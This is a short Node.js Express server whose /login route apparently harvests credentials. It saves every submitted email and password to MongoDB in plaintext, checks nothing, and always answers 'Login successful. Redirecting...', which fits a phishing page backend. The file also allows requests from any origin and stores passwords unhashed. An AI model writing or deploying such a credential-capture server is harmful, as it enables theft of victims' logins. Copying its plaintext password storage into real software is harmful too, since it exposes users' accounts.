// index.js
import express from 'express';
import mongoose from 'mongoose';
import bodyParser from 'body-parser';
import cors from 'cors';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';

// Load environment variables
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB Connection
async function connectDb() {
  try {
    await mongoose.connect(process.env.MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log('MongoDB connected successfully!');
  } catch (error) {
    console.error('Error connecting to MongoDB:', error);
  }
}
connectDb();

// Middleware
app.use(cors({ origin: '*' })); // Allow all origins for simplicity
app.use(bodyParser.json());

// Serve static files
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
app.use(express.static(path.join(__dirname, 'public')));

// Define User model
const userSchema = new mongoose.Schema({
  email: { type: String, required: true },
  password: { type: String, required: true },
});
const User = mongoose.model('User', userSchema);

// Routes
app.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    // Save user data in the database
    const newUser = new User({ email, password });
    await newUser.save();

    // Send success response
    res.status(201).json({ message: 'Login successful. Redirecting...' });
  } catch (error) {
    console.error('Error saving user:', error);
    res.status(500).json({ error: 'Error saving user data. Please try again later.' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
